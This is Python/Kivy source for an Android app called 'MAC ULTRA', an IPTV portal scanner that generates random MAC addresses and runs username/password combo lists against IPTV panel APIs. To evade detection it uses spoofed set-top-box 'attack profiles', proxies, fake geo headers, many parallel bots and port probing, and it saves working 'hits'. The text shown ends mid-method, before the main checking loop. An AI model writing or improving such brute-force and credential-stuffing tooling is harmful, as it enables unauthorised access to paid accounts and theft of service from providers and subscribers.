# MAC ULTRA PRIVATE BUILD VERSION
# PRIVATE REPO:
# https://github.com/Morpheus0410/MAC-ULTRA

import os, asyncio, time, urllib.parse, httpx, random, ssl, json, socket, hashlib
from datetime import datetime
from threading import Thread

from kivy.app import App
from kivy.clock import Clock
from kivy.core.window import Window
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.floatlayout import FloatLayout
from kivy.uix.gridlayout import GridLayout
from kivy.uix.label import Label
from kivy.uix.spinner import Spinner
from kivy.uix.button import Button
from kivy.uix.scrollview import ScrollView
from kivy.uix.textinput import TextInput
from kivy.uix.slider import Slider
from kivy.uix.progressbar import ProgressBar
from kivy.uix.image import Image
from kivy.core.clipboard import Clipboard
from kivy.graphics import Color, RoundedRectangle
from kivy.uix.screenmanager import ScreenManager, Screen
from kivy.utils import platform

# --- ANDROID 13/14 SPEICHER-FIX ---
def request_android_storage_permissions():
    """Fordert normale Medien-/Storage-Rechte an und öffnet bei Android 11+
    die Systemeinstellung für 'Alle Dateien Zugriff', damit öffentliche Ordner
    wie /storage/emulated/0/Combo wieder funktionieren."""
    if platform != "android":
        return

    try:
        from android.permissions import request_permissions, Permission
        perms = []

        for name in (
            "READ_EXTERNAL_STORAGE",
            "WRITE_EXTERNAL_STORAGE",
            "READ_MEDIA_IMAGES",
            "READ_MEDIA_VIDEO",
            "READ_MEDIA_AUDIO",
        ):
            if hasattr(Permission, name):
                perms.append(getattr(Permission, name))

        if perms:
            request_permissions(perms)
    except Exception:
        pass

    try:
        request_manage_all_files_access()
    except Exception:
        pass



def has_manage_all_files_access():
    if platform != "android":
        return True
    try:
        from jnius import autoclass
        Environment = autoclass("android.os.Environment")
        return bool(Environment.isExternalStorageManager())
    except Exception:
        return False


def request_manage_all_files_access():
    """Öffnet Android-Einstellung 'Alle Dateien Zugriff' für diese App.
    Der Nutzer muss dort MAC ULTRA erlauben."""
    if platform != "android":
        return
    try:
        from jnius import autoclass
        PythonActivity = autoclass("org.kivy.android.PythonActivity")
        Settings = autoclass("android.provider.Settings")
        Intent = autoclass("android.content.Intent")
        Uri = autoclass("android.net.Uri")
        Environment = autoclass("android.os.Environment")

        if Environment.isExternalStorageManager():
            return

        activity = PythonActivity.mActivity
        package_name = activity.getPackageName()
        intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
        intent.setData(Uri.parse("package:" + package_name))
        activity.startActivity(intent)
    except Exception:
        try:
            from jnius import autoclass
            PythonActivity = autoclass("org.kivy.android.PythonActivity")
            Settings = autoclass("android.provider.Settings")
            Intent = autoclass("android.content.Intent")
            activity = PythonActivity.mActivity
            intent = Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)
            activity.startActivity(intent)
        except Exception:
            pass


def get_android_external_app_dir():
    if platform != "android":
        return ""
    try:
        from jnius import autoclass
        PythonActivity = autoclass("org.kivy.android.PythonActivity")
        activity = PythonActivity.mActivity
        folder = activity.getExternalFilesDir(None)
        if folder:
            return folder.getAbsolutePath()
    except Exception:
        pass
    return ""


def get_app_base_dir():
    try:
        app = App.get_running_app()
        if app and app.user_data_dir:
            return app.user_data_dir
    except Exception:
        pass
    return os.getcwd()


def get_data_dirs(kind):
    """Öffentliche Hauptspeicher-Ordner werden zuerst genutzt.
    App-Ordner bleiben als Fallback erhalten."""
    if kind == "Combo":
        dirs = [
            "/storage/emulated/0/Combo",
            "/sdcard/Combo",
            "/storage/emulated/0/Download/Combo",
            "/storage/emulated/0/Documents/Combo",
        ]
    elif kind == "Portals":
        dirs = [
            "/storage/emulated/0/Portals",
            "/sdcard/Portals",
        ]
    elif kind == "proxies":
        dirs = [
            "/storage/emulated/0/proxies",
            "/sdcard/proxies",
        ]
    elif kind == "Hits":
        dirs = [
            "/storage/emulated/0/Hits",
            "/sdcard/Hits",
        ]
    else:
        dirs = []

    ext_app = get_android_external_app_dir()
    if ext_app:
        dirs.append(os.path.join(ext_app, kind))

    dirs.append(os.path.join(get_app_base_dir(), kind))

    out = []
    for d in dirs:
        if d and d not in out:
            out.append(d)
    return out


def ensure_app_folders():
    for kind in ("Combo", "Portals", "proxies", "Hits"):
        for folder in get_data_dirs(kind):
            try:
                os.makedirs(folder, exist_ok=True)
            except Exception:
                pass


def first_existing_file(filename, folders):
    for folder in folders:
        path = os.path.join(folder, filename)
        if os.path.exists(path):
            return path
    return None


def first_writable_dir(kind):
    for folder in get_data_dirs(kind):
        try:
            os.makedirs(folder, exist_ok=True)
            test_file = os.path.join(folder, ".write_test")
            with open(test_file, "w", encoding="utf-8") as f:
                f.write("ok")
            try:
                os.remove(test_file)
            except Exception:
                pass
            return folder
        except Exception:
            continue
    return get_app_base_dir()


# --- ANDROID SPEICHERBERECHTIGUNG (LEGACY) ---
def request_android_storage_permissions():
    if platform != "android":
        return
    try:
        from android.permissions import request_permissions, Permission
        request_permissions([
            Permission.READ_EXTERNAL_STORAGE,
            Permission.WRITE_EXTERNAL_STORAGE,
        ])
    except Exception:
        pass

def get_combo_dirs():
    dirs = [
        "/storage/emulated/0/Combo",
        "/sdcard/Combo",
        "/storage/emulated/0/Download/Combo",
        "/storage/emulated/0/Documents/Combo",
    ]
    try:
        app_dir = App.get_running_app().user_data_dir
        dirs.append(os.path.join(app_dir, "Combo"))
    except Exception:
        pass
    return dirs

def first_existing_file(filename, folders):
    for folder in folders:
        path = os.path.join(folder, filename)
        if os.path.exists(path):
            return path
    return None


def get_fav_file_candidates():
    candidates = [
        "/storage/emulated/0/Portals/favoriten_liste.json",
        "/sdcard/Portals/favoriten_liste.json",
    ]

    ext_app = get_android_external_app_dir()
    if ext_app:
        candidates.append(os.path.join(ext_app, "Portals", "favoriten_liste.json"))

    try:
        candidates.append(os.path.join(get_app_base_dir(), "Portals", "favoriten_liste.json"))
    except Exception:
        pass

    out = []
    for path in candidates:
        if path and path not in out:
            out.append(path)
    return out


def load_favorites_data():
    for fav_path in get_fav_file_candidates():
        if not os.path.exists(fav_path):
            continue
        try:
            with open(fav_path, "r", encoding="utf-8") as f:
                loaded = json.load(f)
            if isinstance(loaded, dict):
                return {
                    "mac": loaded.get("mac", []) if isinstance(loaded.get("mac", []), list) else [],
                    "m3u": loaded.get("m3u", []) if isinstance(loaded.get("m3u", []), list) else [],
                }
        except Exception:
            pass
    return {"mac": [], "m3u": []}


def save_favorites_data(data):
    if not isinstance(data, dict):
        data = {"mac": [], "m3u": []}

    data = {
        "mac": data.get("mac", []) if isinstance(data.get("mac", []), list) else [],
        "m3u": data.get("m3u", []) if isinstance(data.get("m3u", []), list) else [],
    }

    # zuerst öffentlichen Hauptspeicher versuchen
    for fav_path in get_fav_file_candidates():
        try:
            os.makedirs(os.path.dirname(fav_path), exist_ok=True)
            with open(fav_path, "w", encoding="utf-8") as f:
                json.dump(data, f, ensure_ascii=False, indent=2)
            return fav_path
        except Exception:
            continue
    return None


# --- AUTOMATISCHE ORDNER-ERSTELLUNG & PFADE ---
def ensure_environment():
    ensure_app_folders()
    base_paths = [
        "/storage/emulated/0/Portals",
        "/storage/emulated/0/Hits/MAC-ULTRA-Hits/MAC_Hits",
        "/storage/emulated/0/Hits/MAC-ULTRA-Hits/M3U_Hits",
        "/storage/emulated/0/proxies",
        "/sdcard/Combo",
        "/storage/emulated/0/Combo",
        "/storage/emulated/0/Download/Combo",
        "/storage/emulated/0/Documents/Combo"
    ]
    for path in base_paths:
        try:
            os.makedirs(path, exist_ok=True)
        except Exception:
            pass

request_android_storage_permissions()
ensure_environment()

# --- ANDROID NATIVE AUDIO INITIALISIERUNG ---
try:
    from jnius import autoclass
    MediaPlayer = autoclass('android.media.MediaPlayer')
    mPlayer = MediaPlayer()
    HAS_JNIUS = True
except:
    HAS_JNIUS = False

# --- KONFIGURATION & FARBEN ---
FAV_FILE = get_fav_file_candidates()[0]
# Pfad für Musik angepasst (Asset-Name statt Absolutpfad für APK)
MUSIC_PATH = "music.mp3" 
COMMON_PORTS = [80, 8080, 8880, 25461, 8000, 2082, 2086, 2095, 8443, 443]

BG_DARK = (0.01, 0.02, 0.04, 1)
CARD_COLOR = (0.05, 0.07, 0.12, 1)
CYAN = (0, 0.9, 1, 1)
GREEN = (0, 1, 0.5, 1)
RED = (1, 0.2, 0.2, 1)
YELLOW = (1, 0.8, 0, 1)
WHITE = (1, 1, 1, 1)

DEFAULT_CIPHERS = (
    "TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:"
    "TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256"
)

ATTACK_PROFILES = [
    {'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721', 'X-User-Agent': 'Model: MAG254; Link: Ethernet'},
    {'User-Agent': 'Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, wie Gecko) Chrome/125.0.0.0 Mobile Safari/537.36'},
    {'User-Agent': 'okhttp/4.9.1'},
    {'User-Agent': 'Kodi/20.2 (X11; Linux x86_64) App_Bitness/64'},
    {'User-Agent': 'Mozilla/5.0 (SMART-TV; Linux; Tizen 6.0) AppleWebkit/537.36 (KHTML, like Gecko) SamsungBrowser/4.0 Chrome/76.0.3809.146 TV Safari/537.36'}
]

GEO_DATA = {
    'IT': {'ip': ['151', '185', '79', '93'], 'lang': 'it-IT,it;q=0.9', 'tz': 'Europe/Rome'},
    'DE': {'ip': ['85', '188', '93', '95'], 'lang': 'de-DE,de;q=0.9', 'tz': 'Europe/Berlin'},
    'FR': {'ip': ['5', '80', '78', '176'], 'lang': 'fr-FR,fr;q=0.9', 'tz': 'Europe/Paris'},
    'US': {'ip': ['3', '13', '34', '52'], 'lang': 'en-US,en;q=0.9', 'tz': 'America/New_York'},
    'ES': {'ip': ['83', '95', '79'], 'lang': 'es-ES,es;q=0.9', 'tz': 'Europe/Madrid'}
}

MAC_VARIANTS = ('00:1A:79:', 'D4:CF:F9:', '33:44:CF:', '10:27:BE:', 'A0:BB:3E:', '55:93:EA:', '04:D6:AA:', '00:1B:79:', '00:2A:01:')

# =========================================================
# GITHUB DEVICE SECURITY
# =========================================================

CONFIG_URL = "https://raw.githubusercontent.com/PetReturn/Fake/main/sys_config.json"


def get_android_id():
    if platform != "android":
        return "PC-TEST"

    try:
        from jnius import autoclass

        PythonActivity = autoclass(
            "org.kivy.android.PythonActivity"
        )

        SettingsSecure = autoclass(
            "android.provider.Settings$Secure"
        )

        resolver = (
            PythonActivity.mActivity
            .getContentResolver()
        )

        android_id = SettingsSecure.getString(
            resolver,
            SettingsSecure.ANDROID_ID
        )

        return str(android_id).strip()

    except Exception:
        return None


async def github_device_allowed():

    android_id = get_android_id()

    if not android_id:
        return False, "Keine Android-ID"

    try:
        async with httpx.AsyncClient(
            timeout=10
        ) as client:

            r = await client.get(CONFIG_URL)

            data = r.json()

        if not data.get("system_active", True):
            return False, "System deaktiviert"

        devices = data.get("allowed_devices", [])

        for dev in devices:

            dev_id = str(
                dev.get("android_id", "")
            ).strip()

            active = dev.get("active", True)

            if (
                dev_id == android_id
                and active is True
            ):
                return True, android_id

        return False, (
            f"Nicht freigeschaltet:\n{android_id}"
        )

    except Exception as e:

        return False, (
            f"GitHub Fehler:\n{e}"
        )


# --- STYLED COMPONENTS ---
class StyledCard(BoxLayout):
    def __init__(self, bg_color=CARD_COLOR, radius=[15,], **kwargs):
        super().__init__(**kwargs)
        with self.canvas.before:
            self.bg_color_inst = Color(*bg_color)
            self.rect = RoundedRectangle(pos=self.pos, size=self.size, radius=radius)
        self.bind(pos=self.update_rect, size=self.update_rect)
    def update_rect(self, *args): self.rect.pos, self.rect.size = self.pos, self.size

class StyledButton(Button):
    def __init__(self, bg_color=CARD_COLOR, radius=[10,], **kwargs):
        super().__init__(**kwargs)
        self.background_normal, self.background_color = "", (0,0,0,0)
        with self.canvas.before:
            self.bg_color_inst = Color(*bg_color)
            self.rect = RoundedRectangle(pos=self.pos, size=self.size, radius=radius)
        self.bind(pos=self.update_rect, size=self.update_rect)
    def update_rect(self, *args): self.rect.pos, self.rect.size = self.pos, self.size

class StyledSpinner(Spinner):
    def __init__(self, bg_color=CARD_COLOR, radius=[10,], **kwargs):
        super().__init__(**kwargs)
        self.background_normal, self.background_color = "", (0,0,0,0)
        with self.canvas.before:
            self.bg_color_inst = Color(*bg_color)
            self.rect = RoundedRectangle(pos=self.pos, size=self.size, radius=radius)
        self.bind(pos=self.update_rect, size=self.update_rect)
    def update_rect(self, *args): self.rect.pos, self.rect.size = self.pos, self.size

# --- SCREENS ---


class IntroScreen(Screen):
    def __init__(self, **kw):
        super().__init__(**kw)

        root = BoxLayout(
            orientation="vertical",
            padding=[20, 30, 20, 20],
            spacing=14
        )

        with self.canvas.before:
            Color(0.01, 0.02, 0.04, 1)
            self.bg_rect = RoundedRectangle(pos=self.pos, size=self.size)
        self.bind(pos=self._update_bg, size=self._update_bg)

        try:
            if os.path.exists("mac-ultra.png"):
                logo = Image(source="mac-ultra.png", size_hint_y=None, height=260)
                root.add_widget(logo)
            else:
                root.add_widget(Label(
                    text="[color=00E6FF][b]MAC ULTRA[/b][/color]",
                    markup=True,
                    size_hint_y=None,
                    height=100,
                    font_size="30sp"
                ))
        except Exception:
            root.add_widget(Label(
                text="[color=00E6FF][b]MAC ULTRA[/b][/color]",
                markup=True,
                size_hint_y=None,
                height=100,
                font_size="30sp"
            ))

        title = Label(
            text="[color=00E6FF][b]WILLKOMMEN BEI MAC ULTRA V1[/b][/color]",
            markup=True,
            size_hint_y=None,
            height=55,
            font_size="20sp"
        )
        root.add_widget(title)

        welcome_text = """[color=FFFFFF]
[b]Scan-Modi & Portal-Management[/b]

[b]Dual-Engine Modus:[/b]
Wähle zwischen MAC SCAN für klassische Portale
oder M3U SCAN für User/Pass-Listen.

[b]Multi-Portal Support:[/b]
Prüfe einzelne URLs oder lade komplette
Portal-Listen (.txt).

[b]Favoriten-System:[/b]
Speichere wichtige Portale direkt in der App.


[b]Präzisions-Einstellungen[/b]

[b]Random MAC Generator:[/b]
Erzeuge automatisch viele MAC-Adressen
basierend auf bekannten Präfixen.

[b]Combo-File Import:[/b]
Nutze eigene Combo-Listen
für gezielte Prüfungen.

[b]Bot-Steuerung:[/b]
Reguliere Geschwindigkeit und
parallele Prozesse.

[b]Smart-Delay System:[/b]
Nutze einstellbare Delays
oder Smart-Modi.


[b]Erweiterte Filter & Verbindung[/b]

[b]Länder-Filter:[/b]
Filtere Ergebnisse gezielt
nach Ländern oder Kategorien.

[b]Proxy-Support:[/b]
Nutze eigene Proxy-Listen inklusive
Stabilitätsprüfung.

[b]Flexible Header-Profile:[/b]
Verwendet verschiedene Geräte-
und Client-Profile.


[b]Detail-Ergebnisse[/b]

[b]Detail-Modus:[/b]
Zeigt zusätzliche Informationen wie
Kanäle, Filme, Serien, Ablaufdatum
und Kategorien.

[b]Server-Info:[/b]
Zeigt Server-IP, Provider und
Länderinformationen an.


[b]Output & Hits[/b]

[b]Strukturierte Speicherung:[/b]
Alle Treffer werden übersichtlich
nach Portalen gespeichert.

[b]Auto-M3U Link:[/b]
Erzeugt automatisch passende
M3U-Links.
[/color]"""

        scroll = ScrollView(size_hint=(1, 1))
        intro_text = Label(
            text=welcome_text,
            markup=True,
            font_size="15sp",
            size_hint_y=None,
            halign="left",
            valign="top"
        )
        intro_text.bind(width=lambda instance, value: setattr(instance, "text_size", (value, None)))
        intro_text.bind(texture_size=lambda instance, value: setattr(instance, "height", value[1]))

        scroll.add_widget(intro_text)
        root.add_widget(scroll)

        start_btn = Button(
            text="ZUM SCANNER WEITER",
            size_hint_y=None,
            height=75,
            font_size="18sp",
            background_normal="",
            background_color=(0.0, 0.45, 0.65, 1),
            color=(1, 1, 1, 1)
        )
        start_btn.bind(on_press=self.go_to_scanner)
        root.add_widget(start_btn)
        self.add_widget(root)

    def _update_bg(self, *args):
        self.bg_rect.pos = self.pos
        self.bg_rect.size = self.size

    def go_to_scanner(self, *a):
        self.manager.current = "main"



class PortalManagerScreen(Screen):
    def __init__(self, **kw):
        super().__init__(**kw)
        self.layout = BoxLayout(orientation="vertical", padding=[20, 40, 20, 20], spacing=15)
        self.layout.add_widget(Label(text="[color=00E6FF][b]MAC ULTRA FAVORITEN[/b][/color]", markup=True, size_hint_y=None, height=80, font_size="28sp"))
        input_card = StyledCard(orientation="vertical", size_hint_y=None, height=220, padding=15, spacing=12)
        self.new_portal_input = TextInput(hint_text="http://url.com:8080", multiline=False, size_hint_y=None, height=75, background_color=(0.1, 0.1, 0.1, 1), foreground_color=(1,1,1,1), padding=[10, 20])
        row = BoxLayout(size_hint_y=None, height=65, spacing=15)
        self.type_spinner = StyledSpinner(text="MAC PORTAL", values=("MAC PORTAL", "M3U PORTAL"), color=CYAN, bold=True)
        add_btn = StyledButton(text="HINZUFÜGEN", bg_color=(0.05, 0.15, 0.1, 1), color=GREEN, on_press=self.add_portal)
        row.add_widget(self.type_spinner); row.add_widget(add_btn)
        input_card.add_widget(self.new_portal_input); input_card.add_widget(row)
        self.layout.add_widget(input_card)
        header_row = BoxLayout(size_hint_y=None, height=30)
        header_row.add_widget(Label(text="MAC LISTE", color=YELLOW, bold=True)); header_row.add_widget(Label(text="M3U LISTE", color=CYAN, bold=True))
        self.layout.add_widget(header_row)
        lists_container = BoxLayout(spacing=15)
        self.mac_list = GridLayout(cols=1, spacing=8, size_hint_y=None); self.mac_list.bind(minimum_height=self.mac_list.setter('height'))
        self.m3u_list = GridLayout(cols=1, spacing=8, size_hint_y=None); self.m3u_list.bind(minimum_height=self.m3u_list.setter('height'))
        sc1 = ScrollView(); sc1.add_widget(self.mac_list); sc2 = ScrollView(); sc2.add_widget(self.m3u_list)
        lists_container.add_widget(sc1); lists_container.add_widget(sc2)
        self.layout.add_widget(lists_container)
        self.layout.add_widget(StyledButton(text="ZURÜCK ZUM SCANNER", size_hint_y=None, height=100, on_press=self.go_back, color=RED, bold=True))
        self.add_widget(self.layout)

    def load_favs(self):
        self.mac_list.clear_widgets()
        self.m3u_list.clear_widgets()

        data = load_favorites_data()

        for url in data.get("mac", []):
            self.mac_list.add_widget(self.create_entry(url, "mac"))
        for url in data.get("m3u", []):
            self.m3u_list.add_widget(self.create_entry(url, "m3u"))

    def create_entry(self, url, p_type):
        card = StyledCard(size_hint_y=None, height=70, padding=5, spacing=5)
        btn = StyledButton(text=url.replace("http://", "").replace("https://", "")[:20], font_size="12sp", on_press=lambda x: self.copy_and_back(url))
        del_btn = StyledButton(text="X", size_hint_x=0.25, bg_color=(0.3, 0.05, 0.05, 1), color=RED, on_press=lambda x: self.delete_portal(url, p_type))
        card.add_widget(btn); card.add_widget(del_btn); return card

    def add_portal(self, *a):
        url = self.new_portal_input.text.strip()
        if not url.startswith("http"):
            return

        p_type = "mac" if "MAC" in self.type_spinner.text else "m3u"
        data = load_favorites_data()

        if url not in data[p_type]:
            data[p_type].append(url)

        saved_path = save_favorites_data(data)

        self.new_portal_input.text = ""
        self.load_favs()

        try:
            main = self.manager.get_screen('main')
            main.portal_input.text = url
            main.refresh_portal_lists()
            if saved_path:
                main.update_log_safe(f"[color=00FF00][FAVORIT][/color] Favorit gespeichert: {saved_path}")
            else:
                main.update_log_safe("[color=FF0000][FAVORIT][/color] Favorit konnte nicht gespeichert werden. Speicherrechte prüfen.")
        except Exception:
            pass

    def delete_portal(self, url, p_type):
        data = load_favorites_data()

        if url in data.get(p_type, []):
            data[p_type].remove(url)

        save_favorites_data(data)
        self.load_favs()

        try:
            self.manager.get_screen('main').refresh_portal_lists()
        except Exception:
            pass

    def copy_and_back(self, url):
        Clipboard.copy(url); self.manager.get_screen('main').portal_input.text = url; self.manager.current = 'main'

    def go_back(self, *a): self.manager.current = 'main'

class MagUltraScreen(Screen):
    def __init__(self, **kw):
        super().__init__(**kw)
        self.box = BoxLayout(orientation="vertical", padding=[20, 35, 20, 20], spacing=15)
        Window.clearcolor = BG_DARK
        self.hits, self.checked, self.total_lines, self.running = 0, 0, 0, False
        self.hit_list, self.last_status, self.start_time = [], "READY", time.time()
        self.proxy_list, self.working_proxies, self.use_proxies = [], [], False
        self.error_streak = 0; self.request_count = 0
        self.portal_isp = "Unknown"
        self.current_api_path = "/player_api.php"
        self.current_api_method = "GET"
        
        # UI - Pfad für Logo auf Asset-Name geändert (für APK)
        self.box.add_widget(Image(source='mac-ultra.png', size_hint_y=None, height=320, allow_stretch=True, keep_ratio=False))
        stats = GridLayout(cols=3, size_hint_y=None, height=110, spacing=15)
        self.cpm_label = self.create_stat_box(stats, "CPM", "0", YELLOW)
        self.status_code_label = self.create_stat_box(stats, "STATUS", "READY", CYAN)
        self.hit_count_label = self.create_stat_box(stats, "MAC ULTRA HITS", "0", GREEN)
        self.box.add_widget(stats)
        
        url_card = StyledCard(orientation="vertical", size_hint_y=None, height=380, padding=15, spacing=12)
        self.portal_input = TextInput(text="http://", multiline=False, size_hint_y=None, height=75)
        
        filter_row = BoxLayout(size_hint_y=None, height=60, spacing=10)
        self.portal_file_spinner = StyledSpinner(text="SELECT PORTAL LIST", values=self.load_portal_lists(), size_hint_x=0.6, color=YELLOW)
        self.country_filter = TextInput(hint_text="LAND (z.B. DE)", multiline=False, size_hint_x=0.4, background_color=(0.1, 0.12, 0.15, 1), foreground_color=WHITE, padding=[10, 15])
        filter_row.add_widget(self.portal_file_spinner); filter_row.add_widget(self.country_filter)
        
        det_row = BoxLayout(size_hint_y=None, height=50, spacing=10)
        self.engine_mode = StyledSpinner(text="MAC/M3U SCAN", values=("MAC SCAN", "M3U SCAN"), size_hint_x=0.4, color=CYAN)
        self.detail_slider = Slider(min=0, max=1, value=0, step=1, size_hint_x=0.2); self.detail_status = Label(text="NUR MAC/URL", color=RED, size_hint_x=0.4)
        self.detail_slider.bind(value=self.update_slider_label); det_row.add_widget(self.engine_mode); det_row.add_widget(self.detail_slider); det_row.add_widget(self.detail_status)
        btn_row = BoxLayout(spacing=15, size_hint_y=None, height=75)
        btn_row.add_widget(StyledButton(text="PASTE", on_press=self.paste_clip, color=CYAN))
        btn_row.add_widget(StyledButton(text="FAVORITEN", on_press=self.go_to_manager, color=YELLOW))
        url_card.add_widget(self.portal_input); url_card.add_widget(filter_row); url_card.add_widget(det_row); url_card.add_widget(btn_row); self.box.add_widget(url_card)
        
        cfg_card = StyledCard(orientation="vertical", size_hint_y=None, height=430, padding=15, spacing=10)
        m_row = BoxLayout(spacing=10, size_hint_y=None, height=60)
        self.scan_mode = StyledSpinner(text="COMBO FILE", values=("COMBO FILE", "RANDOM SCAN")); self.prefix_spinner = StyledSpinner(text="MAC's", values=MAC_VARIANTS, color=YELLOW)
        m_row.add_widget(self.scan_mode); m_row.add_widget(self.prefix_spinner)
        combo_row = BoxLayout(size_hint_y=None, height=65, spacing=10)
        self.file_spinner = StyledSpinner(text="SELECT COMBO", values=self.load_combos(), color=CYAN, size_hint_x=0.68)
        self.refresh_combo_btn = StyledButton(text="REFRESH", color=YELLOW, size_hint_x=0.32, on_press=self.refresh_file_lists)
        combo_row.add_widget(self.file_spinner)
        combo_row.add_widget(self.refresh_combo_btn)

        random_row = BoxLayout(size_hint_y=None, height=85, spacing=10)
        random_row.add_widget(Label(text="MAC-ANZAHL", color=YELLOW, size_hint_x=0.28, bold=True))
        self.random_count = TextInput(
            text="",
            input_filter="int",
            multiline=False,
            size_hint_x=0.72,
            height=85,
            font_size="26sp",
            halign="center",
            background_color=(0.95, 0.95, 0.95, 1),
            foreground_color=(0, 0, 0, 1),
            padding=[10, 22]
        )
        random_row.add_widget(self.random_count)
        
        delay_row = BoxLayout(size_hint_y=None, height=60, spacing=10)
        self.delay_mode_spinner = StyledSpinner(text="NORMAL", values=("NORMAL", "SMART: 1-3s", "SMART: 2-4s", "SMART: 3-6s"), color=YELLOW)
        self.delay_value_display = Label(text="0.10s", color=YELLOW, size_hint_x=0.2); self.delay_slider = Slider(min=0.0, max=2.0, value=0.1, step=0.05, size_hint_x=0.4)
        self.delay_slider.bind(value=lambda i, v: setattr(self.delay_value_display, 'text', f"{v:.2f}s"))
        delay_row.add_widget(self.delay_mode_spinner); delay_row.add_widget(self.delay_value_display); delay_row.add_widget(self.delay_slider)
        
        bot_row = BoxLayout(size_hint_y=None, height=60, spacing=10)
        self.bot_label = Label(text="BOTS: 40", color=CYAN, size_hint_x=0.3)
        self.bot_slider = Slider(min=1, max=100, value=40, step=1, size_hint_x=0.7)
        self.bot_slider.bind(value=lambda i, v: setattr(self.bot_label, 'text', f"BOTS: {int(v)}"))
        bot_row.add_widget(self.bot_label); bot_row.add_widget(self.bot_slider)

        cfg_card.add_widget(m_row); cfg_card.add_widget(combo_row); cfg_card.add_widget(random_row); cfg_card.add_widget(delay_row); cfg_card.add_widget(bot_row)
        self.box.add_widget(cfg_card)
        
        proxy_card = StyledCard(orientation="horizontal", size_hint_y=None, height=70, padding=10, spacing=10)
        self.proxy_source = StyledSpinner(text="FILE", values=("FILE", "FREE (ProxyScrape)"), size_hint_x=0.28)
        self.proxy_spinner = StyledSpinner(text="SELECT PROXY", values=self.load_proxies(), size_hint_x=0.28)
        self.proxy_toggle_btn = StyledButton(text="PROXY: OFF", size_hint_x=0.22, color=RED, on_press=self.toggle_proxy)
        self.storage_btn = StyledButton(text="SPEICHER", size_hint_x=0.22, color=YELLOW, on_press=self.open_storage_settings)
        proxy_card.add_widget(self.proxy_source)
        proxy_card.add_widget(self.proxy_spinner)
        proxy_card.add_widget(self.proxy_toggle_btn)
        proxy_card.add_widget(self.storage_btn)
        self.box.add_widget(proxy_card)
        
        self.progress_label = Label(text="PROGRESS: 0 / 0", size_hint_y=None, height=20, color=CYAN); self.box.add_widget(self.progress_label); self.pbar = ProgressBar(max=100, value=0, size_hint_y=None, height=10); self.box.add_widget(self.pbar)
        self.scroll = ScrollView()
        self.log_display = Label(
            text="Ready...",
            font_size="14sp",
            size_hint_y=None,
            markup=True,
            halign="left",
            valign="top"
        )
        self.log_display.bind(width=lambda instance, value: setattr(instance, "text_size", (value, None)))
        self.log_display.bind(texture_size=lambda instance, value: setattr(instance, "height", value[1] + 20))
        self.scroll.add_widget(self.log_display)
        self.box.add_widget(self.scroll)
        
        bottom_row = BoxLayout(size_hint_y=None, height=110, spacing=15)
        self.start_btn = StyledButton(text="START MAC ULTRA", size_hint_x=0.7, on_press=self.toggle, bg_color=(0.05, 0.15, 0.1, 1), color=GREEN)
        self.music_stop_btn = StyledButton(text="STOP MUSIC", size_hint_x=0.3, on_press=self.stop_native_audio, bg_color=(0.15, 0.05, 0.05, 1), color=RED)
        bottom_row.add_widget(self.start_btn); bottom_row.add_widget(self.music_stop_btn)
        self.box.add_widget(bottom_row)
        self.add_widget(self.box)
        Clock.schedule_once(lambda dt: self.refresh_file_lists(), 1)
        Clock.schedule_once(lambda dt: self.refresh_portal_lists(), 1.2)
        Clock.schedule_once(lambda dt: self.check_storage_status(), 2)

    async def find_working_port(self, base_url):
        clean_url = base_url.replace("http://", "").replace("https://", "").split(":")[0].split("/")[0]
        self.update_log_safe(f"[color=FFFF00][SCAN][/color] Testing Ports for {clean_url}...")
        for port in COMMON_PORTS:
            if not self.running: return None
            Clock.schedule_once(lambda dt: setattr(self.status_code_label, 'text', f"P:{port}"))
            try:
                conn = asyncio.open_connection(clean_url, port)
                _, writer = await asyncio.wait_for(conn, timeout=1.2)
                writer.close()
                await writer.wait_closed()
                
                async with httpx.AsyncClient(timeout=1.5) as client:
                    test_url = f"http://{clean_url}:{port}"
                    r = await client.get(test_url)
                    if r.status_code in [200, 404, 403]:
                        self.update_log_safe(f"[color=00FF00][FOUND][/color] Port {port} is OPEN!")
                        return test_url
            except: continue
        return None

    async def discover_best_api(self, portal, ctx):
        endpoints = [
            {"name": "Player GET", "path": "/player_api.php", "method": "GET"},
            {"name": "Player POST", "path": "/player_api.php", "method": "POST"},
            {"name": "Panel GET", "path": "/panel_api.php", "method": "GET"},
        ]
        self.update_log_safe("[color=00FFFF][SCAN][/color] Teste API Endpunkte...")
        async with httpx.AsyncClient(verify=ctx, timeout=5.0) as client:
            for ep in endpoints:
                if not self.running: break
                try:
                    if ep["method"] == "GET":
                        r = await client.get(f"{portal}{ep['path']}?username=test&password=test")
                    else:
                        r = await client.post(f"{portal}{ep['path']}", data={"username": "test", "password": "test"})
                    if r.status_code == 200:
                        self.update_log_safe(f"[color=00FF00][API][/color] Nutze {ep['name']}")
                        return ep['path'], ep['method']
                except: continue
        return "/player_api.php", "GET"

    def check_vpn_restriction(self, response_text):
        triggers = ["blocked", "vpn", "proxy", "country lock", "not available in your country"]
        return any(t in response_text.lower() for t in triggers)

    async def get_vpn_info_api(self, ip):
        if not ip or ip == "Unknown": return "No IP"
        try:
            async with httpx.AsyncClient(timeout=4) as client:
                r = await client.get(f"http://ip-api.com/json/{ip}")
                data = r.json()
                if data.get('status') == 'success':
                    isp = data.get('isp', 'Unknown')
                    is_vpn = " [VPNVPN/DATA]" if data.get('hosting', False) or "VPN" in isp.upper() else ""
                    return f"{data.get('countryCode', '??')}{is_vpn}"
        except: pass
        return "N/A"

    def play_native_audio(self):
        if not HAS_JNIUS: return
        # Prüfen ob music.mp3 als Asset im APK-Bundle liegt
        try:
            mPlayer.reset()
            # In Kivy/Buildozer liegen Assets oft im aktuellen Verzeichnis
            if os.path.exists("music.mp3"):
                mPlayer.setDataSource("music.mp3")
            elif os.path.exists(MUSIC_PATH): # Fallback
                mPlayer.setDataSource(MUSIC_PATH)
            else:
                return
            mPlayer.prepare(); mPlayer.setLooping(True); mPlayer.start()
        except: pass

    def stop_native_audio(self, *a):
